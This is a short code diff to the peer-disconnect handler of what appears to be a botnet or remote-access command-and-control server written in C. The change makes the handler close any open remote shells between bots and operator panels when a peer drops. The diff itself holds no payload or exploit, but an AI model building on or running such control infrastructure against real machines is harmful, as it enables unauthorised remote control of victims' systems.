@@ -242,14 +242,32 @@ void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
 void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     int i;
 
-    /* remove peer from panels list (if it's a panel) */
-    if (peer->type == PEER_AUTH)
-        laikaC_rmvAuth(cnc, peer);
+    switch (peer->type) {
+        case PEER_BOT: {
+            struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)peer->uData;
+
+            /* close any open shells */
+            if (bInfo->shellAuth)
+                laikaC_closeBotShell(bInfo);
+            break;
+        }
+        case PEER_AUTH: {
+            struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)peer->uData;
+
+            /* close any open shells */
+            if (aInfo->shellBot)
+                laikaC_closeAuthShell(aInfo);
+
+            /* remove peer from panels list */
+            laikaC_rmvAuth(cnc, peer);
+            break;
+        }
+        default: break;
+    }
 
     /* notify connected panels of the disconnected peer */
     for (i = 0; i < cnc->authPeersCount; i++) {
-        if (cnc->authPeers[i] != peer) /* don't send disconnect event to themselves */
-            laikaC_sendRmvPeer(cnc->authPeers[i], peer);
+        laikaC_sendRmvPeer(cnc->authPeers[i], peer);
     }
 
     /* remove from peer lookup map */
